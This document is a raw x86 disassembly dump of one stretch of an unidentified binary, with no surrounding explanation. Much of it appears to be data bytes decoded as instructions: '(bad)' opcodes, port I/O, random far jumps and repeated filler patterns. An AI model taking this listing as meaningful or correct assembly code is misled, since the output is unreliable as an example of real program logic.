  43f508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f509:	add    eax,0x46fb27b4
  43f50e:	out    0x14,al
  43f510:	cmc    
  43f511:	sub    bh,cl
  43f513:	push   ss
  43f514:	add    BYTE PTR [ecx],bl
  43f516:	add    BYTE PTR [eax],al
  43f518:	add    BYTE PTR [eax],al
  43f51a:	add    BYTE PTR [ebx+0x1b],ch
  43f51d:	pop    ebp
  43f51e:	add    al,0x62
  43f520:	pop    ds
  43f521:	add    BYTE PTR [edx],bh
  43f523:	ins    DWORD PTR es:[edi],dx
  43f524:	xor    eax,0x1c91d16a
  43f529:	lds    ebx,FWORD PTR fs:[ebp+0x26]
  43f52d:	inc    ebx
  43f52e:	rcl    DWORD PTR [ebx+0x25],1
  43f531:	jo     0x43f4f0
  43f533:	push   ecx
  43f534:	sbb    ebp,DWORD PTR [edx-0x59]
  43f537:	dec    ecx
  43f538:	push   ds
  43f539:	je     0x43f507
  43f53b:	push   0x7d840002
  43f540:	aas    
  43f541:	arpl   WORD PTR [ebp-0x7797e3c3],bx
  43f547:	inc    esp
  43f548:	es ins BYTE PTR es:[edi],dx
  43f54a:	mov    WORD PTR [edx-0x627587bb],ds
  43f550:	adc    dh,BYTE PTR [eax+edx*4-0x59]
  43f554:	sbb    al,0x42
  43f556:	nop
  43f557:	mov    dl,BYTE PTR [esi]
  43f559:	arpl   WORD PTR [ebx+0x76],di
  43f55c:	sub    bh,bh
  43f55e:	lea    ebx,[ebp+0x694c5d0a]
  43f564:	push   ss
  43f565:	pop    ecx
  43f566:	push   ecx
  43f567:	nop
  43f568:	sbb    al,0x64
  43f56a:	inc    ebp
  43f56b:	pop    esp
  43f56c:	and    BYTE PTR ds:0x276e9,ch
  43f572:	jmp    0xe943f7ed
  43f577:	jbe    0x43f57b
  43f579:	add    cl,ch
  43f57b:	jbe    0x43f57f
  43f57d:	add    cl,ch
  43f57f:	add    BYTE PTR [eax],al
  43f581:	add    BYTE PTR [eax],al
  43f583:	add    BYTE PTR [esi+0x2],dh
  43f586:	add    cl,ch
  43f588:	jbe    0x43f58c
  43f58a:	add    cl,ch
  43f58c:	jbe    0x43f590
  43f58e:	add    cl,ch
  43f590:	jbe    0x43f594
  43f592:	add    cl,ch
  43f594:	jbe    0x43f598
  43f596:	add    BYTE PTR [eax],al
  43f598:	dec    esp
  43f599:	add    eax,0x54c0000
  43f59e:	add    BYTE PTR [eax],al
  43f5a0:	pop    esp
  43f5a1:	add    eax,0x55c0000
  43f5a6:	add    BYTE PTR [eax],al
  43f5a8:	dec    esp
  43f5a9:	add    eax,0x54c0000
  43f5ae:	add    BYTE PTR [eax],al
  43f5b0:	sbb    al,0x5
  43f5b2:	add    BYTE PTR [eax],al
  43f5b4:	sbb    al,0x5
  43f5b6:	add    BYTE PTR [eax],al
  43f5b8:	or     al,0x5
  43f5ba:	add    BYTE PTR [eax],al
  43f5bc:	or     al,0x5
  43f5be:	add    BYTE PTR [eax],al
  43f5c0:	sbb    al,0x5
  43f5c2:	add    BYTE PTR [eax],al
  43f5c4:	sbb    al,0x5
  43f5c6:	add    BYTE PTR [eax],al
  43f5c8:	or     al,0x5
  43f5ca:	add    BYTE PTR [eax],al
  43f5cc:	or     al,0x5
  43f5ce:	add    BYTE PTR [eax],al
  43f5d0:	fadd   QWORD PTR [eax+eax*1]
  43f5d3:	add    ah,bl
  43f5d5:	add    al,0x0
  43f5d7:	add    ah,cl
  43f5d9:	add    al,0x0
  43f5db:	add    ah,cl
  43f5dd:	add    al,0x0
  43f5df:	add    ah,bl
  43f5e1:	add    al,0x0
  43f5e3:	add    ah,bl
  43f5e5:	add    al,0x0
  43f5e7:	add    BYTE PTR [eax],al
  43f5e9:	add    BYTE PTR [eax],al
  43f5eb:	add    BYTE PTR [eax],al
  43f5ed:	int3   
  43f5ee:	add    al,0x0
  43f5f0:	add    ah,cl
  43f5f2:	add    al,0x0
  43f5f4:	add    BYTE PTR [esp+eax*1+0x49c0000],bl
  43f5fb:	add    BYTE PTR [eax],al
  43f5fd:	mov    WORD PTR [eax+eax*1],es
  43f600:	add    BYTE PTR [esp+eax*1+0x49c0000],cl
  43f607:	add    BYTE PTR [eax],al
  43f609:	pushf  
  43f60a:	add    al,0x0
  43f60c:	add    BYTE PTR [esp+eax*1+0x48c0000],cl
  43f613:	add    BYTE PTR [eax],al
  43f615:	jne    0x43f5b0
  43f617:	cld    
  43f618:	push   DWORD PTR [ebp-0x67]
  43f61b:	cld    
  43f61c:	push   DWORD PTR [ebp-0x67]
  43f61f:	cld    
  43f620:	push   DWORD PTR [ebp-0x67]
  43f623:	cld    
  43f624:	push   DWORD PTR [ebp-0x67]
  43f627:	cld    
  43f628:	push   DWORD PTR [ebp-0x67]
  43f62b:	cld    
  43f62c:	push   DWORD PTR [ebp-0x67]
  43f62f:	cld    
  43f630:	push   DWORD PTR [ebp-0x67]
  43f633:	cld    
  43f634:	push   DWORD PTR [ebp-0x67]
  43f637:	cld    
  43f638:	push   DWORD PTR [ebp-0x67]
  43f63b:	cld    
  43f63c:	push   DWORD PTR [ebp-0x67]
  43f63f:	cld    
  43f640:	push   DWORD PTR [ebp-0x67]
  43f643:	cld    
  43f644:	push   DWORD PTR [ebp-0x67]
  43f647:	cld    
  43f648:	push   DWORD PTR [ebp-0x67]
  43f64b:	cld    
  43f64c:	push   DWORD PTR [ebp-0x67]
  43f64f:	cld    
  43f650:	inc    DWORD PTR [eax]
  43f652:	add    BYTE PTR [eax],al
  43f654:	add    BYTE PTR [eax],al
  43f656:	jne    0x43f5f1
  43f658:	cld    
  43f659:	push   DWORD PTR [ebp-0x67]
  43f65c:	cld    
  43f65d:	push   DWORD PTR [ebp-0x67]
  43f660:	cld    
  43f661:	push   DWORD PTR [ebp-0x67]
  43f664:	cld    
  43f665:	push   DWORD PTR [ebp-0x67]
  43f668:	cld    
  43f669:	push   DWORD PTR [ebp-0x67]
  43f66c:	cld    
  43f66d:	push   DWORD PTR [ebp-0x67]
  43f670:	cld    
  43f671:	push   DWORD PTR [ebp-0x67]
  43f674:	cld    
  43f675:	push   DWORD PTR [ebp-0x67]
  43f678:	cld    
  43f679:	push   DWORD PTR [ebp-0x67]
  43f67c:	cld    
  43f67d:	push   DWORD PTR [ebp-0x67]
  43f680:	cld    
  43f681:	push   DWORD PTR [ebp-0x67]
  43f684:	cld    
  43f685:	push   DWORD PTR [ebp-0x67]
  43f688:	cld    
  43f689:	push   DWORD PTR [ebp-0x67]
  43f68c:	cld    
  43f68d:	push   DWORD PTR [ebp-0x67]
  43f690:	cld    
  43f691:	push   DWORD PTR [ebp+0x2]
  43f694:	out    0x3,eax
  43f696:	jne    0x43f69a
  43f698:	out    0x3,eax
  43f69a:	jne    0x43f69e
  43f69c:	out    0x3,eax
  43f69e:	jne    0x43f6a2
  43f6a0:	out    0x3,eax
  43f6a2:	jne    0x43f6a6
  43f6a4:	out    0x3,eax
  43f6a6:	jne    0x43f6aa
  43f6a8:	out    0x3,eax
  43f6aa:	jne    0x43f6ae
  43f6ac:	out    0x3,eax
  43f6ae:	jne    0x43f6b2
  43f6b0:	out    0x3,eax
  43f6b2:	jne    0x43f6b6
  43f6b4:	out    0x3,eax
  43f6b6:	jne    0x43f6ba
  43f6b8:	out    0x3,eax
  43f6ba:	add    BYTE PTR [eax],al
  43f6bc:	add    BYTE PTR [eax],al
  43f6be:	add    BYTE PTR [ebp+0x2],dh
  43f6c1:	out    0x3,eax
  43f6c3:	jne    0x43f6c7
  43f6c5:	out    0x3,eax
  43f6c7:	jne    0x43f6cb
  43f6c9:	out    0x3,eax
  43f6cb:	jne    0x43f6cf
  43f6cd:	out    0x3,eax
  43f6cf:	jne    0x43f6d3
  43f6d1:	out    0x3,eax
  43f6d3:	jne    0x43f6d7
  43f6d5:	out    0x3,eax
  43f6d7:	jne    0x43f6db
  43f6d9:	out    0x3,eax
  43f6db:	jne    0x43f6df
  43f6dd:	out    0x3,eax
  43f6df:	jne    0x43f6e3
  43f6e1:	cmove  esi,DWORD PTR ds:0x35453f02
  43f6e8:	add    ch,al
  43f6ea:	add    dh,BYTE PTR [ebp+0x2]
  43f6ed:	fld    DWORD PTR [edx]
  43f6ef:	jne    0x43f6f3
  43f6f1:	loop   0x43f6f6
  43f6f3:	jne    0x43f6f7
  43f6f5:	outs   dx,DWORD PTR ds:[esi]
  43f6f6:	dec    ebx
  43f6f7:	xor    eax,0x35431702
  43f6fc:	add    ah,bh
  43f6fe:	add    esi,DWORD PTR [ebp+0x2]
  43f701:	icebp  
  43f702:	add    esi,DWORD PTR [ebp+0x2]
  43f705:	fiadd  DWORD PTR [ebx]
  43f707:	jne    0x43f70b
  43f709:	out    0x3,eax
  43f70b:	jne    0x43f70f
  43f70d:	pop    DWORD PTR [ebx+0x35]
  43f710:	add    al,BYTE PTR [eax]
  43f712:	jmp    0xda43f98d
  43f717:	jbe    0x43f71b
  43f719:	add    dh,ch
  43f71b:	jbe    0x43f71f
  43f71d:	add    cl,ch
  43f71f:	jbe    0x43f723
  43f721:	add    al,ch
  43f723:	add    BYTE PTR [eax],al
  43f725:	add    BYTE PTR [eax],al
  43f727:	add    BYTE PTR [esi+0x2],dh
  43f72a:	add    BYTE PTR [edi],bl
  43f72c:	sbb    ecx,esi
  43f72e:	mov    ah,0x38
  43f730:	pop    eax
  43f731:	dec    ebx
  43f732:	inc    ebx
  43f733:	jmp    0xc943f9ae
  43f738:	jge    0x43f7b9
  43f73a:	push   ss
  43f73b:	jmp    0xe943f9b6
  43f740:	jbe    0x43f744
  43f742:	add    cl,ch
  43f744:	jbe    0x43f748
  43f746:	add    cl,ch
  43f748:	jb     0x43f74c
  43f74a:	add    al,ch
  43f74c:	add    cl,BYTE PTR [ebx+0x276fcf8]
  43f752:	add    dl,dh
  43f754:	jbe    0x43f758
  43f756:	add    BYTE PTR [ecx+0x2e000276],ch
  43f75c:	jbe    0x43f760
  43f75e:	add    BYTE PTR [ecx+0x71],ch
  43f761:	add    al,BYTE PTR [eax]
  43f763:	push   0xf1f88b12
  43f768:	jbe    0x43f76c
  43f76a:	add    cl,ah
  43f76c:	jbe    0x43f770
  43f76e:	add    cl,cl
  43f770:	jbe    0x43f774
  43f772:	add    BYTE PTR [esi+0x76],bh
  43f775:	add    al,BYTE PTR [eax]
  43f777:	jmp    0xe943f9f2
  43f77c:	jbe    0x43f780
  43f77e:	add    cl,ch
  43f780:	push   esi
  43f781:	(bad)  
  43f782:	cmp    cl,ch
  43f784:	jbe    0x43f788
  43f786:	add    cl,ch
  43f788:	jbe    0x43f78c
  43f78a:	add    cl,ch
  43f78c:	add    BYTE PTR [eax],al
  43f78e:	add    BYTE PTR [eax],al
  43f790:	add    BYTE PTR [esi-0x73ffc000],ch
  43f796:	add    DWORD PTR [eax],eax
  43f798:	add    BYTE PTR [ecx+eax*1+0x6b9c0000],bl
  43f79f:	add    BYTE PTR [eax-0x74],al
  43f7a2:	add    DWORD PTR [eax],eax
  43f7a4:	add    BYTE PTR [ecx+eax*1-0x7d640000],cl
  43f7ab:	add    al,0x40
  43f7ad:	pop    esp
  43f7ae:	add    DWORD PTR [eax],eax
  43f7b0:	add    BYTE PTR [ecx+eax*1+0x0],cl
  43f7b4:	add    BYTE PTR [ecx+eax*8+0x7],bh
  43f7b8:	inc    eax
  43f7b9:	pop    esp
  43f7ba:	add    DWORD PTR [eax],eax
  43f7bc:	add    BYTE PTR [ecx+eax*1+0x0],bl
  43f7c0:	add    BYTE PTR [eax],bh
  43f7c2:	jne    0x43f7ce
  43f7c4:	inc    eax
  43f7c5:	dec    esp
  43f7c6:	add    DWORD PTR [eax],eax
  43f7c8:	add    BYTE PTR [ecx+eax*1],bl
  43f7cb:	add    BYTE PTR [eax+0x400f09aa],al
  43f7d1:	or     al,0x1
  43f7d3:	add    BYTE PTR [eax],al
  43f7d5:	or     al,0x1
  43f7d7:	add    BYTE PTR [eax],ah
  43f7d9:	nop
  43f7da:	das    
  43f7db:	adc    al,BYTE PTR [eax+0x1c]
  43f7de:	add    DWORD PTR [eax],eax
  43f7e0:	add    BYTE PTR [eax*1+0x7c77c9b7],cl
  43f7e7:	sub    al,0x40
  43f7e9:	fadd   QWORD PTR [eax]
  43f7eb:	add    BYTE PTR [ecx+0x1bc6bd71],ah
  43f7f1:	mov    ss,WORD PTR [eax+0x46]
  43f7f4:	inc    eax
  43f7f5:	add    BYTE PTR [eax],al
  43f7f7:	add    BYTE PTR [eax],al
  43f7f9:	add    BYTE PTR [eax+esi*2-0x67b34a6a],ch
  43f800:	mov    al,ds:0x618299ad
  43f805:	inc    eax
  43f806:	pop    esp
  43f807:	inc    edx
  43f808:	cmc    
  43f809:	and    eax,0x4f8687a9
  43f80e:	jne    0x43f86b
  43f810:	jnp    0x43f852
  43f812:	jne    0x43f83e
  43f814:	jb     0x43f7e6
  43f816:	or     al,bl
  43f818:	or     DWORD PTR [ebx],eax
  43f81a:	call   0x35dd6310
  43f81f:	ret    0x9f5a
  43f822:	xor    esi,eax
  43f824:	jl     0x43f833
  43f826:	repnz sbb DWORD PTR [esi-0x4a],edi
  43f82a:	xor    eax,0x1bd2e024
  43f82f:	pop    ebp
  43f830:	call   0xb5cc:0xbdf18a46
  43f837:	mov    edx,es
  43f839:	fucomip st,st(1)
  43f83b:	jb     0x43f7c0
  43f83d:	(bad)  
  43f83e:	mov    edx,0xb4a76f3f
  43f843:	aad    0x80
  43f845:	fs test al,0xc4
  43f848:	aad    0x8a
  43f84a:	inc    edx
  43f84b:	stos   BYTE PTR es:[edi],al
  43f84c:	pushf  
  43f84d:	jnp    0x43f806
  43f84f:	ins    DWORD PTR es:[edi],dx
  43f850:	mov    eax,0x79334b89
  43f855:	hlt    
  43f856:	push   cs
  43f857:	mov    esp,0x7ab64e66
  43f85c:	mov    eax,ds:0x71
  43f861:	add    BYTE PTR [eax],al
  43f863:	push   ss
  43f864:	fimul  WORD PTR [ebp+0x7d1d5a26]
  43f86a:	and    DWORD PTR [ecx-0x30ef0bff],edi
  43f870:	loope  0x43f8db
  43f872:	(bad)  
  43f874:	out    0xc7,al
  43f876:	cmc    
  43f877:	xor    DWORD PTR [eax],eax
  43f879:	arpl   bx,dx
  43f87b:	out    0xf4,al
  43f87d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f87e:	fisubr WORD PTR [edi]
  43f880:	jg     0x43f8f3
  43f882:	enter  0x8638,0xc8
  43f886:	shl    ah,0xa3
  43f889:	bound  ebp,QWORD PTR [ecx-0x63604ceb]
  43f88f:	xor    eax,DWORD PTR [edx]
  43f891:	hlt    
  43f892:	es test dh,bh
  43f895:	push   ebx
  43f896:	xor    esp,0x15
  43f899:	pop    ecx
  43f89a:	retf   
  43f89b:	cmp    bh,BYTE PTR ds:0x6391422f
  43f8a1:	push   ebp
  43f8a2:	fimul  DWORD PTR [ecx-0x2b]
  43f8a5:	jle    0x43f8f8
  43f8a7:	lahf   
  43f8a8:	das    
  43f8a9:	and    al,0x65
  43f8ab:	xchg   edi,eax
  43f8ac:	sub    eax,0xc71fc6ec
  43f8b1:	ins    DWORD PTR es:[edi],dx
  43f8b2:	jge    0x43f8b4
  43f8b4:	sub    BYTE PTR [edx+0x4792173e],bl
  43f8ba:	jecxz  0x43f8de
  43f8bc:	ss inc esp
  43f8be:	(bad)  
  43f8bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f8c0:	and    DWORD PTR [eax+0x6e27f99e],ebx
  43f8c6:	mov    ebx,0x0
  43f8cb:	add    BYTE PTR [edi+0x299a602d],dl
  43f8d1:	and    edi,DWORD PTR ds:0x98f4276
  43f8d7:	pop    ebp
  43f8d8:	adc    BYTE PTR [edx+0x1caabebb],bh
  43f8de:	mov    ds:0x67309ca,eax
  43f8e3:	mov    bl,BYTE PTR [eax]
  43f8e5:	xor    edi,eax
  43f8e7:	(bad)  
  43f8e8:	push   edi
  43f8e9:	adc    eax,0x27503e7
  43f8ee:	and    al,0xcf
  43f8f0:	das    
  43f8f1:	mov    esi,0xbe2ecf1a
  43f8f6:	xor    cl,bh
  43f8f8:	jmp    0x712290c7
  43f8fd:	mov    bl,0x45
  43f8ff:	adc    ebx,DWORD PTR [esi-0x1d9fce08]
  43f905:	retf   0x279c
  43f908:	mov    BYTE PTR [ebx+0x1be58ea9],ch
  43f90e:	add    bl,bl
  43f910:	cmc    
  43f911:	(bad)  
  43f912:	cmp    BYTE PTR [edx],ch
  43f914:	add    eax,0xdb0062d7
  43f919:	xor    dl,BYTE PTR [ecx]
  43f91b:	xchg   esi,eax
  43f91c:	loopne 0x43f8b9
  43f91e:	cmp    BYTE PTR [ecx+0x2683ed6e],bh
  43f924:	call   0x3899:0x16acac41
  43f92b:	sub    DWORD PTR [edi],edx
  43f92d:	push   ecx
  43f92e:	inc    bp
  43f930:	add    BYTE PTR [eax],al
  43f932:	add    BYTE PTR [eax],al
  43f934:	add    BYTE PTR [esi],cl
  43f936:	add    BYTE PTR [ebx+0x38a5f4f6],bh
  43f93c:	fimul  DWORD PTR [ebp+0x4e]
  43f93f:	cmp    eax,0x93b51423
  43f944:	push   esi
  43f945:	daa    
  43f946:	mov    ds:0x8cfcab38,eax
  43f94b:	leave  
  43f94c:	or     ch,dh
  43f94e:	clc    
  43f94f:	jo     0x43f8fe
  43f951:	fisub  DWORD PTR [ebp+0x2fbac638]
  43f957:	fistp  WORD PTR [esi*1-0x28836cb4]
  43f95e:	sar    BYTE PTR [eax],0x7b
  43f961:	xor    eax,0x62dc3537
  43f966:	mov    ebp,0x5a9b8f13
  43f96b:	cmp    BYTE PTR [edi],ah
  43f96d:	push   esi
  43f96e:	push   eax
  43f96f:	xchg   ebx,eax
  43f970:	add    BYTE PTR [ebp+ebx*2+0x762e7819],dh
  43f977:	cmp    BYTE PTR ds:0x65ddc412,al
  43f97d:	push   ebx
  43f97e:	into   
  43f97f:	cs mov bl,bh
  43f982:	(bad)  
  43f984:	mov    BYTE PTR [ebp+0x418fbf31],ah
  43f98a:	ss jl  0x43f98d
  43f98d:	scas   al,BYTE PTR es:[edi]
  43f98e:	sub    BYTE PTR [eax+0x3f],bl
  43f991:	arpl   WORD PTR [edi+eiz*1-0x73],bx
  43f995:	shr    BYTE PTR [ebx],cl
  43f997:	mov    eax,DWORD PTR [ebp+0x0]
  43f99d:	add    BYTE PTR [ecx-0x7fc0c398],ah
  43f9a3:	lods   eax,DWORD PTR ds:[esi]
  43f9a4:	popf   
  43f9a5:	jmp    0xea641cff
  43f9aa:	dec    ebx
  43f9ab:	push   ss
  43f9ac:	and    edi,DWORD PTR [edi]
  43f9ae:	sub    DWORD PTR [edx],ebx
  43f9b0:	call   0xec46:0x7be9f8e4
  43f9b7:	dec    edx
  43f9b8:	dec    ebp
  43f9b9:	ds das 
  43f9bb:	jmp    0xd2b3c5bd
  43f9c0:	outs   dx,BYTE PTR ds:[esi]
  43f9c1:	sbb    DWORD PTR [ebx],0xe
  43f9c4:	jp     0x43fa03
  43f9c6:	in     eax,dx
  43f9c7:	xor    bl,BYTE PTR [bx+di]
  43f9ca:	xchg   cl,ah
  43f9cc:	sbb    al,0x43
  43f9ce:	cmp    eax,0x3d3ca4c5
  43f9d3:	jbe    0x43f99e
  43f9d5:	cmp    dh,bl
  43f9d7:	inc    esp
  43f9d8:	(bad)  
  43f9d9:	mov    eax,0x3bcf6a4c
  43f9de:	call   0x774c4a5f
  43f9e3:	das    
  43f9e4:	loope  0x43f9c9
  43f9e6:	xchg   edx,eax
  43f9e7:	and    edi,esp
  43f9e9:	cmp    dl,BYTE PTR [edx+0x9]
  43f9ec:	ds inc edx
  43f9ee:	adc    esi,DWORD PTR [ebx]
  43f9f0:	xchg   edx,eax
  43f9f1:	jne    0x43fa06
  43f9f3:	dec    eax
  43f9f4:	cmp    cl,BYTE PTR es:[edi]
  43f9f7:	out    dx,al
  43f9f8:	sbb    edx,edx
  43f9fa:	outs   dx,DWORD PTR ds:[esi]
  43f9fb:	dec    ecx
  43f9fc:	sub    ch,dh
  43f9fe:	aad    0x14
  43fa00:	push   ebx
  43fa01:	cmp    DWORD PTR [eax],eax
  43fa03:	add    BYTE PTR [eax],al
  43fa05:	add    BYTE PTR [eax],al
  43fa07:	inc    edx
  43fa08:	test   BYTE PTR [esi-0x62b8dc40],dh
  43fa0e:	xor    BYTE PTR [ebp+0x39],0x63
  43fa12:	mov    dl,0xa7
  43fa14:	std    
  43fa15:	and    al,0xae
  43fa17:	cmp    BYTE PTR fs:[ebx],dh
  43fa1a:	cdq    
  43fa1b:	xor    DWORD PTR [edx+0x4d],esp
  43fa1e:	setno  BYTE PTR [esi+0x5188e44b]
  43fa25:	enter  0x4648,0x71
  43fa29:	lds    esp,FWORD PTR [eax+edx*2+0x18]
  43fa2d:	xor    eax,0xb55ad904
  43fa32:	mov    ebp,0xc1abb418
  43fa37:	jae    0x43fa5a
  43fa39:	lahf   
  43fa3a:	xchg   DWORD PTR [edi],ebp
  43fa3c:	lock ins BYTE PTR es:[edi],dx
  43fa3e:	cmp    eax,edx
  43fa40:	jmp    0x634a:0xe95d1d82
  43fa47:	xlat   BYTE PTR ds:[ebx]
  43fa48:	pop    esi
  43fa49:	or     BYTE PTR [eax+0x7a68a01a],0x84
  43fa50:	jne    0x43fa32
  43fa52:	fsqrt  
  43fa54:	addr16 mov cl,0xc7
  43fa57:	jns    0x43fab7
  43fa59:	pop    ebp
  43fa5a:	xlat   BYTE PTR ds:[ebx]
  43fa5b:	jg     0x43f9f6
  43fa5d:	cld    
  43fa5e:	push   DWORD PTR [ebp-0x3]
  43fa61:	or     eax,0xe017540
  43fa66:	inc    eax
  43fa67:	jne    0x43fa1e
  43fa69:	push   cs
  43fa6a:	inc    eax
  43fa6b:	add    BYTE PTR [eax],al
  43fa6d:	add    BYTE PTR [eax],al
  43fa6f:	add    BYTE PTR [ebp-0x47],dh
  43fa72:	push   cs
  43fa73:	inc    eax
  43fa74:	jne    0x43fac3
  43fa76:	push   cs
  43fa77:	inc    eax
  43fa78:	jne    0x43facb
  43fa7a:	push   cs
  43fa7b:	inc    eax
  43fa7c:	jne    0x43fae3
  43fa7e:	push   cs
  43fa7f:	inc    eax
  43fa80:	jne    0x43faeb
  43fa82:	push   cs
  43fa83:	inc    eax
  43fa84:	jne    0x43fae3
  43fa86:	push   cs
  43fa87:	inc    eax
  43fa88:	jne    0x43faeb
  43fa8a:	push   cs
  43fa8b:	inc    eax
  43fa8c:	jne    0x43fa90
  43fa8e:	stos   DWORD PTR es:[edi],eax
  43fa8f:	adc    DWORD PTR ds:0x3511a702,esi
  43fa95:	add    ah,bh
  43fa97:	add    esi,DWORD PTR [ebp+0x2]
  43fa9a:	out    0x3,eax
  43fa9c:	jne    0x43faa0
  43fa9e:	out    0x3,eax
  43faa0:	jne    0x43faa4
  43faa2:	out    0x3,eax
  43faa4:	jne    0x43faa8
  43faa6:	out    0x3,eax
  43faa8:	jne    0x43faac
  43faaa:	(bad)  
  43faac:	jae    0x43fab0
  43faae:	out    0x3,eax
  43fab0:	jne    0x43fab4
  43fab2:	out    0x3,eax
  43fab4:	jne    0x43fab8
  43fab6:	out    0x3,eax
  43fab8:	jne    0x43fabc
  43faba:	popf   
  43fabb:	mov    ah,0x53
  43fabd:	add    ah,bh
  43fabf:	add    esi,DWORD PTR [ebp+0x2]
  43fac2:	out    0x3,eax
  43fac4:	jne    0x43fac8
  43fac6:	out    0x3,eax
  43fac8:	jne    0x43facc
  43faca:	or     BYTE PTR [eax+0x3e702b3],dh
  43fad0:	jne    0x43fad4
  43fad2:	out    0x3,eax
  43fad4:	add    BYTE PTR [eax],al
  43fad6:	add    BYTE PTR [eax],al
  43fad8:	add    BYTE PTR [ebp+0x2],dh
  43fadb:	out    0x3,eax
  43fadd:	jne    0x43fae1
  43fadf:	cmpxchg BYTE PTR [ebx+0x7503e702],dl
  43fae6:	add    ah,bh
  43fae8:	add    esi,DWORD PTR [ebp+0x2]
  43faeb:	out    0x3,eax
  43faed:	jne    0x43faf1
  43faef:	int3   
  43faf0:	scas   al,BYTE PTR es:[edi]
  43faf1:	jae    0x43faf5
  43faf3:	out    0x3,eax
  43faf5:	jne    0x43faf9
  43faf7:	out    0x3,eax
  43faf9:	jne    0x43fafd
  43fafb:	out    0x3,eax
  43fafd:	jne    0x43fb01
  43faff:	and    eax,0xe70253ae
  43fb04:	add    esi,DWORD PTR [ebp+0x2]
  43fb07:	out    0x3,eax
  43fb09:	jne    0x43fb0d
  43fb0b:	add    cl,ch
  43fb0d:	jbe    0x43fb11
  43fb0f:	add    ah,ah
  43fb11:	and    al,0xc8
  43fb13:	(bad)  
  43fb14:	call   0xe943fd8f
  43fb19:	jbe    0x43fb1d
  43fb1b:	add    cl,ch
  43fb1d:	jbe    0x43fb21
  43fb1f:	add    BYTE PTR [esp+eax*1+0x76e8ffc8],ah
  43fb26:	add    al,BYTE PTR [eax]
  43fb28:	jmp    0xe943fda3
  43fb2d:	jbe    0x43fb31
  43fb2f:	add    BYTE PTR [edx-0x1c],bl
  43fb32:	(bad)  
  43fb33:	(bad)  
  43fb34:	call   0xe943fdaf
  43fb39:	jbe    0x43fb3d
  43fb3b:	add    cl,ch
  43fb3d:	add    BYTE PTR [eax],al
  43fb3f:	add    BYTE PTR [eax],al
  43fb41:	add    BYTE PTR [esi+0x2],dh
  43fb44:	add    BYTE PTR [edx-0x1700381d],ch
  43fb4a:	jbe    0x43fb4e
  43fb4c:	add    cl,ch
  43fb4e:	jbe    0x43fb52
  43fb50:	add    cl,ch
  43fb52:	jbe    0x43fb56
  43fb54:	add    cl,dl
  43fb56:	and    eax,ebp
  43fb58:	(bad)  
  43fb59:	call   0xe943fdd4
  43fb5e:	jbe    0x43fb62
  43fb60:	add    cl,ch
  43fb62:	jbe    0x43fb66
  43fb64:	add    cl,bl
  43fb66:	and    eax,ebp
  43fb68:	(bad)  
  43fb69:	call   0xe943fde4
  43fb6e:	jbe    0x43fb72
  43fb70:	add    cl,ch
  43fb72:	jbe    0x43fb76
  43fb74:	add    BYTE PTR [ecx],ah
  43fb76:	loop   0x43fb3c
  43fb78:	(bad)  
  43fb79:	call   0xe943fdf4
  43fb7e:	jbe    0x43fb82
  43fb80:	add    cl,ch
  43fb82:	jbe    0x43fb86
  43fb84:	add    BYTE PTR [ecx+edi*4+0x1cffffc4],bh
  43fb8b:	add    al,BYTE PTR [eax]
  43fb8d:	add    BYTE PTR [edx+eax*1],cl
  43fb90:	add    BYTE PTR [eax],al
  43fb92:	or     al,0x2
  43fb94:	add    BYTE PTR [eax],al
  43fb96:	arpl   WORD PTR [edi],di
  43fb98:	cmp    al,BYTE PTR [eax]
  43fb9a:	fadd   QWORD PTR [ecx]
  43fb9c:	add    BYTE PTR [eax],al
  43fb9e:	int3   
  43fb9f:	add    DWORD PTR [eax],eax
  43fba1:	add    ah,cl
  43fba3:	add    DWORD PTR [eax],eax
  43fba5:	add    BYTE PTR [eax],al
  43fba7:	add    BYTE PTR [eax],al
  43fba9:	add    BYTE PTR [eax],al
  43fbab:	gs aas 
  43fbad:	cmp    al,BYTE PTR [eax]
  43fbaf:	fadd   QWORD PTR [ecx]
  43fbb1:	add    BYTE PTR [eax],al
  43fbb3:	int3   
  43fbb4:	add    DWORD PTR [eax],eax
  43fbb6:	add    ah,cl
  43fbb8:	add    DWORD PTR [eax],eax
  43fbba:	add    bh,dh
  43fbbc:	inc    ebx
  43fbbd:	cmp    al,BYTE PTR [eax]
  43fbbf:	pushf  
  43fbc0:	add    DWORD PTR [eax],eax
  43fbc2:	add    BYTE PTR [ecx+eax*1+0x18c0000],cl
  43fbc9:	add    BYTE PTR [eax],al
  43fbcb:	out    dx,eax
  43fbcc:	inc    ebx
  43fbcd:	cmp    al,BYTE PTR [eax]
  43fbcf:	pushf  
  43fbd0:	add    DWORD PTR [eax],eax
  43fbd2:	add    BYTE PTR [ecx+eax*1+0x18c0000],cl
  43fbd9:	add    BYTE PTR [eax],al
  43fbdb:	jl     0x43fb98
  43fbdd:	cmp    al,BYTE PTR [eax]
  43fbdf:	pop    esp
  43fbe0:	add    DWORD PTR [eax],eax
  43fbe2:	add    BYTE PTR [ecx+eax*1+0x0],cl
  43fbe6:	add    BYTE PTR [ecx+eax*1+0x0],cl
  43fbea:	add    BYTE PTR [ebx+edi*4+0x3a],ch
  43fbee:	add    BYTE PTR [ecx+eax*1+0x0],bl
  43fbf2:	add    BYTE PTR [ecx+eax*1+0x0],cl
  43fbf6:	add    BYTE PTR [ecx+eax*1+0x0],cl
  43fbfa:	add    dl,dl
  43fbfc:	mov    edx,0x11c003a
  43fc01:	add    BYTE PTR [eax],al
  43fc03:	or     al,0x1
  43fc05:	add    BYTE PTR [eax],al
  43fc07:	jne    0x43fba4
  43fc09:	cld    
  43fc0a:	push   DWORD PTR [ebp-0x31]
  43fc0d:	(bad)  
  43fc0e:	cmp    eax,0x0
  43fc13:	add    BYTE PTR [ebp-0x65],dh
  43fc16:	cld    
  43fc17:	push   DWORD PTR [ebp-0x65]
  43fc1a:	cld    
  43fc1b:	push   DWORD PTR [ebp-0x65]
  43fc1e:	cld    
  43fc1f:	push   DWORD PTR [ebp-0x4f]
  43fc22:	ret    0x753d
  43fc25:	fwait
  43fc26:	cld    
  43fc27:	push   DWORD PTR [ebp-0x65]
  43fc2a:	cld    
  43fc2b:	push   DWORD PTR [ebp-0x65]
  43fc2e:	cld    
  43fc2f:	push   DWORD PTR [ebp+0x7b]
  43fc32:	ret    0x753d
  43fc35:	fwait
  43fc36:	cld    
  43fc37:	push   DWORD PTR [ebp-0x65]
  43fc3a:	cld    
  43fc3b:	push   DWORD PTR [ebp-0x65]
  43fc3e:	cld    
